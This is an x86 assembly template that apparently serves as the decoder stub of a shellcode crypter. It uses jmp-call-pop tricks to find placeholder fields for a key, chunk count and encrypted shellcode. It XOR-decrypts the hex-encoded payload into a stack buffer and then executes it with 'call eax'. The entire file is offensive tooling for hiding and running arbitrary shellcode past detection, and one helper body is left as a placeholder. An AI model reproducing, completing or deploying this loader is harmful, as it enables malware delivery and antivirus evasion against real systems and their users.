_start:
    ; start instructions should go here

    ; set up the stack frame?
    lea ecx, 4[esp]
    and esp, -16
    push DWORD PTR -4[ecx]
    push ebp
    mov ebp, esp
    push edi
    push esi
    push ebx
    push ecx
    sub esp, 56
    
    mov eax, DWORD PTR gs:20
    mov DWORD PTR -28[ebp], eax
    xor eax, eax
    mov eax, esp
    mov edi, eax
    jmp iv_string
_start_iv_string:
    pop eax
    mov DWORD PTR -60[ebp], eax
    jmp num_chunks_lbl_one
_start_num_chunks_lbl_one:
    pop eax
    mov eax, [eax]
    sal eax, 3
    add eax, 1
    mov edx, eax
    sub edx, 1
    mov DWORD PTR -56[ebp], edx
    mov edx, 16
    sub edx, 1
    add eax, edx
    mov esi, 16
    xor edx, edx
    div esi
    imul eax, eax, 16
    sub esp, eax
    mov eax, esp
    mov DWORD PTR -52[ebp], eax
    xor eax, eax
    mov DWORD PTR -64[ebp], eax
    jmp L64
L67:
    mov edx, DWORD PTR -64[ebp]
    mov eax, edx
    sal eax, 3
    add eax, edx
    jmp encrypted_sc_lbl_one
_start_encrypted_sc_lbl_one:
    pop edx
    add edx, eax
    sub esp, 4
    lea eax, -37[ebp]
    push eax
    push edx
    push DWORD PTR -60[ebp]
    call crypto_xor
    add esp, 16
    mov edx, DWORD PTR -64[ebp]
    mov eax, edx
    sal eax, 3
    add eax, edx
    jmp encrypted_sc_lbl_two
_start_encrypted_sc_lbl_two:
    pop edx
    add eax, edx
    mov DWORD PTR -60[ebp], eax
    mov eax, DWORD PTR -64[ebp]
    sal eax, 2
    mov DWORD PTR -44[ebp], eax
    mov DWORD PTR -68[ebp], 0
    jmp L65
L66:
    lea edx, -37[ebp]
    mov eax, DWORD PTR -68[ebp]
    add eax, edx
    movzx eax, BYTE PTR [eax]
    movsx eax, al
    sub esp, 12
    push eax
    call crypto_ord
    add esp, 16
    sal eax, 4
    mov esi, eax
    mov eax, DWORD PTR -68[ebp]
    add eax, 1
    movzx eax, BYTE PTR -37[ebp+eax]
    movsx eax, al
    sub esp, 12
    push eax
    call crypto_ord
    add esp, 16
    mov ecx, eax
    mov eax, DWORD PTR -68[ebp]
    mov edx, eax
    shr edx, 31
    add eax, edx
    sar eax
    mov edx, eax
    mov eax, DWORD PTR -44[ebp]
    add edx, eax
    add ecx, esi
    mov eax, DWORD PTR -52[ebp]
    mov BYTE PTR [eax+edx], cl
    add DWORD PTR -68[ebp], 2
L65:
    cmp DWORD PTR -68[ebp], 7
    jle L66
    add DWORD PTR -64[ebp], 1
L64:
    mov edx, DWORD PTR -64[ebp]
    jmp num_chunks_lbl_two
_start_num_chunks_lbl_two:
    pop eax
    mov eax, [eax]
    cmp edx, eax
    jb L67
    jmp num_chunks_lbl_three
_start_num_chunks_lbl_three:
    pop eax
    mov eax, [eax]
    lea edx, 0[eax*4]
    mov eax, DWORD PTR -52[ebp]
    mov BYTE PTR [eax+edx], 0
    mov eax, DWORD PTR -52[ebp]
    mov DWORD PTR -48[ebp], eax
    mov eax, DWORD PTR -48[ebp]
    call eax
    xor eax, eax
    mov esp, edi
    mov esi, DWORD PTR -28[ebp]
    xor esi, DWORD PTR gs:20
    je L69
L69:
    lea esp, -16[ebp]
    pop ecx
    pop ebx
    pop esi
    pop edi
    pop ebp
    lea esp, -4[ecx]
    ret

crypto_strlen:
    ; implement string length
    
    ; set up the stack frame
    push ebp
    mov ebp, esp
    sub esp, 16

    ; store the length counter in -4[ebp]
    xor eax, eax
    mov DWORD PTR -4[ebp], eax
    jmp crypto_strlen_check_for_null_byte
crypto_strlen_inc_length_counter:
    add DWORD PTR -4[ebp], 1
crypto_strlen_check_for_null_byte:
    mov edx, DWORD PTR -4[ebp]
    mov eax, DWORD PTR 8[ebp]
    add eax, edx
    movzx eax, BYTE PTR [eax]
    test al, al
    jne crypto_strlen_inc_length_counter
    mov eax, DWORD PTR -4[ebp]
    leave
    ret
    
crypto_pow:
    ; implement pow(a, b)

    ; set up the stack frame
    push ebp
    mov ebp, esp
    sub esp, 16

    ; store the result in -8[ebp] and the loop counter in -4[ebp]
    xor eax, eax
    mov DWORD PTR -4[ebp], eax
    inc eax
    mov DWORD PTR -8[ebp], eax
    jmp crypto_pow_check_if_done
crypto_pow_mult_base:
    mov eax, DWORD PTR 8[ebp]
    mov edx, DWORD PTR -8[ebp]
    imul eax, edx
    mov DWORD PTR -8[ebp], eax
    add DWORD PTR -4[ebp], 1
crypto_pow_check_if_done:
    mov eax, DWORD PTR -4[ebp]
    cmp eax, DWORD PTR 12[ebp]
    jl crypto_pow_mult_base
    mov eax, DWORD PTR -8[ebp]
    leave
    ret

crypto_ord:
    ; implement conversion of hexadecimal to decimal

    ; set up the stack frame
    push ebp
    mov ebp, esp
    sub esp, 4
    
    ; load up the hexadecimal char to -4[ebp]
    mov eax, DWORD PTR 8[ebp]
    mov BYTE PTR -4[ebp], al
    
    ; check if it's equal to '0'
    cmp BYTE PTR -4[ebp], 48
    jne crypto_ord_49
    xor eax, eax
    leave
    ret
crypto_ord_49:
    ; check if it's equal to '1'
    cmp BYTE PTR -4[ebp], 49
    jne crypto_ord_50
    mov eax, 1
    leave
    ret
crypto_ord_50:
    ; check if it's equal to '2'
    cmp BYTE PTR -4[ebp], 50
    jne crypto_ord_51
    mov eax, 2
    leave
    ret
crypto_ord_51:
    ; check if it's equal to '3'
    cmp BYTE PTR -4[ebp], 51
    jne crypto_ord_52
    mov eax, 3
    leave
    ret
crypto_ord_52:
    ; check if it's equal to '4'
    cmp BYTE PTR -4[ebp], 52
    jne crypto_ord_53
    mov eax, 4
    leave
    ret
crypto_ord_53:
    ; check if it's equal to '5'
    cmp BYTE PTR -4[ebp], 53
    jne crypto_ord_54
    mov eax, 5
    leave
    ret
crypto_ord_54:
    ; check if it's equal to '6'
    cmp BYTE PTR -4[ebp], 54
    jne crypto_ord_55
    mov eax, 6
    leave
    ret
crypto_ord_55:
    ; check if it's equal to '7'
    cmp BYTE PTR -4[ebp], 55
    jne crypto_ord_56
    mov eax, 7
    leave
    ret
crypto_ord_56:
    ; check if it's equal to '8'
    cmp BYTE PTR -4[ebp], 56
    jne crypto_ord_57
    mov eax, 8
    leave
    ret
crypto_ord_57:
    ; check if it's equal to '9'
    cmp BYTE PTR -4[ebp], 57
    jne crypto_ord_65_97
    mov eax, 9
    leave
    ret
crypto_ord_65_97:
    ; check if it's equal to 'A'
    cmp BYTE PTR -4[ebp], 65 
    je crypto_ord_is_65_97
    ; check if it's equal to 'a'
    cmp BYTE PTR -4[ebp], 97
    jne crypto_ord_66_98
crypto_ord_is_65_97:
    ; it is equal to 'A' or 'a'!
    mov eax, 10
    leave
    ret 
crypto_ord_66_98:
    ; check if it's equal to 'B'
    cmp BYTE PTR -4[ebp], 66
    je crypto_ord_is_66_98
    ; check if it's equal to 'b'
    cmp BYTE PTR -4[ebp], 98
    jne crypto_ord_67_99
crypto_ord_is_66_98:
    ; it is equal to 'B' or 'b'!
    mov eax, 11
    leave
    ret
crypto_ord_67_99:
    ; check if it's equal to 'C'
    cmp BYTE PTR -4[ebp], 67
    je crypto_ord_is_67_99
    ; check if it's equal to 'c'
    cmp BYTE PTR -4[ebp], 99
    jne crypto_ord_68_100
crypto_ord_is_67_99:
    ; it is equal to 'C' or 'c'!
    mov eax, 12
    leave
    ret
crypto_ord_68_100:
    ; check if it's equal to 'D'
    cmp BYTE PTR -4[ebp], 68
    je crypto_ord_is_68_100
    ; check if it's equal to 'd'
    cmp BYTE PTR -4[ebp], 100
    jne crypto_ord_69_101
crypto_ord_is_68_100:
    ; it is equal to 'D' or d'!
    mov eax, 13
    leave
    ret
crypto_ord_69_101:
    ; check if it's equal to 'E'
    cmp BYTE PTR -4[ebp], 69
    je crypto_ord_is_69_101
    ; check if it's equal to 'e'
    cmp BYTE PTR -4[ebp], 101
    jne crypto_ord_70_102
crypto_ord_is_69_101:
    ; it is equal to 'E' or 'e'!
    mov eax, 14
    leave
    ret
crypto_ord_70_102:
    ; check if it's equal to 'F'
    cmp BYTE PTR -4[ebp], 70
    je crypto_ord_is_70_102
    ; check if it's equal to 'f'
    cmp BYTE PTR -4[ebp], 102
    jne crypto_ord_error
crypto_ord_is_70_102:
    ; it is equal to 'F' or 'f'!
    mov eax, 15
    leave
    ret
crypto_ord_error:
    ; this should not happen!!!
    mov eax, -1
    leave
    ret

crypto_dec_to_hex:
    ; implement conversion of decimal number to hexadecimal string

    ; set up the stack frame
    push ebp
    mov ebp, esp
    sub esp, 16

    mov eax, DWORD PTR 16[ebp]
    sub eax, 1
    mov DWORD PTR -8[ebp], eax
    jmp crypto_dec_to_hex_check_if_quotient_is_zero
crypto_dec_to_hex_calculate_remainder_and_remainder_less_than_10:
    mov eax, DWORD PTR 8[ebp]
    and eax, 15
    mov DWORD PTR -4[ebp], eax
    cmp DWORD PTR -4[ebp], 9
    ja crypto_dec_to_hex_remainder_greater_than_9
    mov eax, DWORD PTR -4[ebp]
    lea ecx, 48[eax]
    mov edx, DWORD PTR -8[ebp]
    mov eax, DWORD PTR 12[ebp]
    add eax, edx
    mov edx, ecx
    mov BYTE PTR [eax], dl
    jmp crypto_dec_to_hex_calculate_new_quotient
crypto_dec_to_hex_remainder_greater_than_9:
    mov eax, DWORD PTR -4[ebp]
    lea ecx, 55[eax]
    mov edx, DWORD PTR -8[ebp]
    mov eax, DWORD PTR 12[ebp]
    add eax, edx
    mov edx, ecx
    mov BYTE PTR [eax], dl
crypto_dec_to_hex_calculate_new_quotient:
    mov eax, DWORD PTR 8[ebp]
    shr eax, 4
    mov DWORD PTR 8[ebp], eax
    sub DWORD PTR -8[ebp], 1
crypto_dec_to_hex_check_if_quotient_is_zero:
    xor eax, eax
    cmp DWORD PTR 8[ebp], eax
    jne crypto_dec_to_hex_calculate_remainder_and_remainder_less_than_10
    jmp crypto_dec_to_hex_check_if_done
crypto_dec_to_hex_zero_pad:
    mov edx, DWORD PTR -8[ebp]
    mov eax, DWORD PTR 12[ebp]
    add eax, edx
    mov BYTE PTR [eax], 48
    sub DWORD PTR -8[ebp], 1
crypto_dec_to_hex_check_if_done:
    xor ecx, ecx
    cmp DWORD PTR -8[ebp], ecx
    jns crypto_dec_to_hex_zero_pad
    mov edx, DWORD PTR 12[ebp]
    mov eax, DWORD PTR 16[ebp]
    add eax, edx
    mov BYTE PTR [eax], cl 
    nop
    leave
    ret

crypto_xor:
    ; implement xor of two strings
    {{ crypto_xor }}

crypto_xor_sum_both_strings:
    mov edx, DWORD PTR -12[ebp]
    mov eax, DWORD PTR 8[ebp]
    add eax, edx
    movzx eax, BYTE PTR [eax]
    movsx eax, al
    push eax
    call crypto_ord
    add esp, 4
    mov ebx, eax
    mov eax, DWORD PTR -12[ebp]
    lea edx, 1[eax]
    mov eax, DWORD PTR -8[ebp]
    sub eax, edx
    push eax
    push 16
    call crypto_pow
    add esp, 8
    imul eax, ebx
    add DWORD PTR -20[ebp], eax
    mov edx, DWORD PTR -12[ebp]
    mov eax, DWORD PTR 12[ebp]
    add eax, edx
    movzx eax, BYTE PTR [eax]
    movsx eax, al
    push eax
    call crypto_ord
    add esp, 4
    mov ebx, eax
    mov eax, DWORD PTR -12[ebp]
    lea edx, 1[eax]
    mov eax, DWORD PTR -8[ebp]
    sub eax, edx
    push eax
    push 16
    call crypto_pow
    add esp, 8
    imul eax, ebx
    add DWORD PTR -16[ebp], eax
    add DWORD PTR -12[ebp], 1
crypto_xor_check_if_sum_done:
    mov eax, DWORD PTR -12[ebp]
    cmp eax, DWORD PTR -8[ebp]
    jl crypto_xor_sum_both_strings
    mov edx, DWORD PTR -8[ebp]
    mov eax, DWORD PTR -20[ebp]
    xor eax, DWORD PTR -16[ebp]
    push edx
    push DWORD PTR 16[ebp]
    push eax
    call crypto_dec_to_hex
    add esp, 12
    nop
    mov ebx, DWORD PTR -4[ebp]
    leave
    ret

iv_string:
    call _start_iv_string
    {{ KEY }}
    .align 4

num_chunks_lbl_one:
    call _start_num_chunks_lbl_one
    {{ NUM_CHUNKS }}
    .align 4
    
num_chunks_lbl_two:
    call _start_num_chunks_lbl_two
    {{ NUM_CHUNKS }}
    .align 4
    
num_chunks_lbl_three:
    call _start_num_chunks_lbl_three
    {{ NUM_CHUNKS }}
    .align 4
    
encrypted_sc_lbl_one:
    call _start_encrypted_sc_lbl_one
    {{ ENCRYPTED_SC }}

encrypted_sc_lbl_two:
    call _start_encrypted_sc_lbl_two
    {{ ENCRYPTED_SC }}